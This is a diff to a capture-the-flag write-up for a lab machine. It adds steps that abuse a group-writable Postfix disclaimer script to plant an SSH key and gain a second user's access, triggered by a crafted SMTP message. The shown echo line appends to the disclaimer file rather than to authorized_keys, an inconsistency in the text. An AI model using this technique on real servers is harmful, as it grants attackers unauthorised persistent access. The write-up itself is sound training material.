@@ -131,7 +131,7 @@ and on my listener I get a connection as `www-data`
 
 <img src='Images/rev.png'>
 
-In the current directory there's a file called `manage.py`. This file is automatically created in Django projects and is Django’s command-line utility for administrative tasks. Reading the documentation <a href="https://docs.djangoproject.com/en/4.1/ref/django-admin/#shell">here</a> shows you cann interact with the projects databases using the `dbshell` argument.
+In the current directory there's a file called `manage.py`. This file is automatically created in Django projects and is Django’s command-line utility for administrative tasks. Reading the documentation <a href="https://docs.djangoproject.com/en/4.1/ref/django-admin/#shell">here</a> shows you can interact with the projects databases using the `dbshell` argument.
 
 <img src='Images/dbshell.png'>
 
@@ -139,7 +139,28 @@ In the `auth_user` table we see a django password hash for kyle. Copying this to
 
 <img src='Images/sukyle.png'>
 
-We can see kyle is in the `filter` group
+We can see kyle is in the `filter` group.
 
+<img src='Images/postfixdisclaimer.png'>
+
+I'll use find to see what files the `filter` group owns.
+
+`/var/spool/filter` is empty, but we can write to `/etc/postfix/disclaimer`. Postfix is a mail transfer agent we can use to send mail. `/etc/postfix/master.cf` what scripts run when a user receives mail among other things. The last line of `master.cf` shows that `/etc/postfix/disclaimer` runs as john when a user receives mail. And since I can write to `/etc/postfix/disclaimer` I'll include a payload, send mail to a user on the box, and my payload should run as john. I'll add my ssh public key to john's authorized keys by adding the following line to `/etc/postfix/disclaimer`:
+
+`echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCKiry8TPPU0lHxqHU41I4c7vQHqE8OAWwW0UkXAdoMuia8PKi7jRYamltQF/C45GBS745vT4LSAhgazlK6ujQt4Hi3SIxCNkF3xzskbamWNrjqLgk1jfAczVgoNAdqLsaZSQ7Z46ewoU7F5JC+1tYKdoEyXi7tWHbvg45POXmtTyuXtty50WoDq0uklunB9tC2LQZtgoG8fewCRFZz+Q5JSKPjoGCqm+O/MejKvGxpR1JD1I6XhbbpPntFkBRHJQP/+oGw8+2+peXA7392eEP9+0SapCK5e+sAEoVh44H+4BopWl1A5Sq49PPcGZPifcR1jq+iLEYAzgMCwd7ksrn302kOTyfSKTHUkcnrca/k9f9VTQ42S5RMdLmzehfZnyeF5izM2er0IRQuyhyi+8EUturfHfTrlVjlTJjZ62PrWn8T0KokTvjN8nPoVJWZKm5OeFQL3mjA7pRXio91FGQ5OEPFBTE4ONACEgSmPKnChNak/IjsvlxFOON6AdhPLdk= kali@kali' >> /etc/postfix/disclaimer`
+
+Next I'll create a file `email.txt` in `/home/kyle` containing the commands to send an email to `www-data`. It looks like this
+
+```
+EHLO writer.htb
+MAIL FROM:<max@writer.htb>
+RCPT TO:<www-data@writer.htb>
+DATA
+Subject: test
+
+this is a test
+.
+QUIT
+```
 
 
